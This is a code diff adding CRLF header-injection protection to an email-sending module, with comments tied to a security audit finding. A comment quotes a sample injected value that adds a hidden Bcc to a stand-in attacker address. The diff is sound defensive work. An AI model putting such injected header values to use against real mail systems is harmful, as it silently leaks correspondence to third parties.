@@ -1202,6 +1202,42 @@ function buildAlternativeBlock(plain: string, html: string): { lines: string[]; 
  * Boundary is a random hex string — colons / dots / non-ascii avoided so
  * Gmail's strict parser doesn't reject it.
  */
+/**
+ * Strip CR and LF out of anything that is going to be written as an RFC
+ * 2822 header value, or as a quoted parameter inside one.
+ *
+ * S5 (2026-09-14 security audit, item 8) — header injection.
+ *
+ * The MIME envelope is assembled by joining strings with CRLF, so a CR or
+ * an LF inside a value ENDS that header and starts a new one. A display
+ * name, subject line or attachment filename that reached us from an
+ * inbound email, a form relay, or an LLM draft and carried
+ * "\r\nBcc: someone@attacker.example" silently added a blind copy to
+ * every reply the venue sent. A bare "\r\n\r\n" ended the header block
+ * outright and let the rest of the value be the message body.
+ *
+ * Tabs and other C0 controls go too: a lone tab at the start of the next
+ * line is a header continuation, which is the same trick one step round.
+ * Quotes are stripped from filenames by the caller's own quoting because
+ * a `"` would close the quoted-string parameter early.
+ *
+ * Nothing legitimate in a To, Cc, Subject or filename contains a newline,
+ * so this is a strip and not an encode — no caller has to remember to
+ * decode anything on the way back out.
+ */
+export function sanitiseHeaderValue(raw: string | null | undefined): string {
+  if (!raw) return ''
+  return String(raw).replace(/[\r\n\u0000-\u001f\u007f]/g, ' ').trim()
+}
+
+/**
+ * Same strip, plus the double quote, for a value that goes inside a
+ * quoted parameter such as `filename="..."`.
+ */
+export function sanitiseHeaderParam(raw: string | null | undefined): string {
+  return sanitiseHeaderValue(raw).replace(/["\\]/g, '')
+}
+
 function buildMultipartMime(
   headers: string[],
   body: string,
@@ -1242,10 +1278,16 @@ function buildMultipartMime(
     // Wrap base64 to 76-char lines per RFC 2045. Some MTAs and mailbox
     // providers reject very-long base64 lines.
     const wrapped = att.contentBase64.replace(/.{76}/g, '$&\r\n')
+    // S5 (2026-09-14 audit item 8): filenames come from uploads and from
+    // asset rows, so they are attacker-reachable text landing inside a
+    // header. Strip the line breaks and the quote that would close the
+    // parameter early.
+    const safeFilename = sanitiseHeaderParam(att.filename) || 'attachment'
+    const safeMime = sanitiseHeaderValue(att.mimeType) || 'application/octet-stream'
     lines.push(`--${boundary}`)
-    lines.push(`Content-Type: ${att.mimeType}; name="${att.filename}"`)
+    lines.push(`Content-Type: ${safeMime}; name="${safeFilename}"`)
     lines.push('Content-Transfer-Encoding: base64')
-    lines.push(`Content-Disposition: attachment; filename="${att.filename}"`)
+    lines.push(`Content-Disposition: attachment; filename="${safeFilename}"`)
     lines.push('')
     lines.push(wrapped)
   }
@@ -1332,11 +1374,18 @@ export async function sendEmail(
     )
     const hasLinks = detectLinks(body).length > 0
     const htmlBody = hasLinks ? plainTextToEmailHtml(body) : null
+    // S5 (2026-09-14 audit item 8). Every value that becomes a header goes
+    // through sanitiseHeaderValue on the way in. `to` and `subject` are
+    // the ones an attacker reaches most easily: a form-relay display
+    // name, an inbound subject we echo into a reply, an LLM draft. A
+    // "\r\nBcc:" in any of them used to add a silent recipient.
+    const safeTo = sanitiseHeaderValue(to)
+    const safeCc = filteredCc.map(sanitiseHeaderValue).filter(Boolean)
     const messageHeaders = [
-      `From: ${fromEmail}`,
-      `To: ${to}`,
-      ...(filteredCc.length > 0 ? [`Cc: ${filteredCc.join(', ')}`] : []),
-      `Subject: ${subject}`,
+      `From: ${sanitiseHeaderValue(fromEmail)}`,
+      `To: ${safeTo}`,
+      ...(safeCc.length > 0 ? [`Cc: ${safeCc.join(', ')}`] : []),
+      `Subject: ${sanitiseHeaderValue(subject)}`,
       'MIME-Version: 1.0',
       'Content-Type: text/plain; charset="UTF-8"',
     ]
@@ -1358,7 +1407,9 @@ export async function sendEmail(
             name: string
             value: string
           }>
-          const lastMessageId = getHeader(lastHeaders, 'Message-ID')
+          // S5 item 8: a Message-ID read back off a message we did not
+          // write is no more trustworthy than any other inbound header.
+          const lastMessageId = sanitiseHeaderValue(getHeader(lastHeaders, 'Message-ID'))
           if (lastMessageId) {
             messageHeaders.push(`In-Reply-To: ${lastMessageId}`)
             messageHeaders.push(`References: ${lastMessageId}`)
